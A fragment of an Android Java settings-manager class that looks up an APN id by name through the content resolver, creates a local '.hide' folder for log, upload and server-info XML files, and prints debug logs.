    private String getApnIdByName(String apnName) {
        if (apnName == null) return null;
        
        String ret = null;
        Cursor cr = null;
        try {
        String projection[] = { "_id,apn,type,current" };
        cr = mResolver.query(uri_apn_list, projection, "current = 1 and apn = ?"
                                , new String[] {apnName}, null);
        if (cr != null && cr.moveToFirst() == true) {
            while (cr != null) {
                LOGD(cr.getString(cr.getColumnIndex("_id")) + "  "
                        + cr.getString(cr.getColumnIndex("apn")) + "  "
                        + cr.getString(cr.getColumnIndex("type")) + "  "
                        + cr.getString(cr.getColumnIndex("current")));
            
                if (cr.getString(cr.getColumnIndex("type")) != null
                        && cr.getString(cr.getColumnIndex("type")).equals("mms") == false) {
                    ret = cr.getString(cr.getColumnIndex("_id"));
                    break;
                }
                if (cr.moveToNext() == false) {
                    break;
                }
            }
        }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            cr.close();
            cr = null;
        }
        return ret;
    }
    
    private SettingManager(Context context) {
        mContext = context;
        BASE_PATH = context.getFilesDir().getAbsolutePath() + "/.hide/";
        File file = new File(BASE_PATH);
        if (file.exists() == false) {
            file.mkdirs();
        }
        SETTING_FILE_NAME = "setting";
        mSP = context.getSharedPreferences(SETTING_FILE_NAME, Context.MODE_PRIVATE);
        mEditor = mSP.edit();
        mLog = LogUtil.getInstance(BASE_PATH + "log.txt");
        UPLOAD_FILE_PATH = BASE_PATH + "upload.xml";
        DOWNLOAD_FILE_PATH = BASE_PATH + "serverInfo.xml";
        VEDIO_DOWNLOAD_FILE_PATH = BASE_PATH + "vedio.xml";
        mConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        mResolver = mContext.getContentResolver();
    }
    
    private void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getName() 
                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                    + "]] " + msg);
        }
    }
    
}
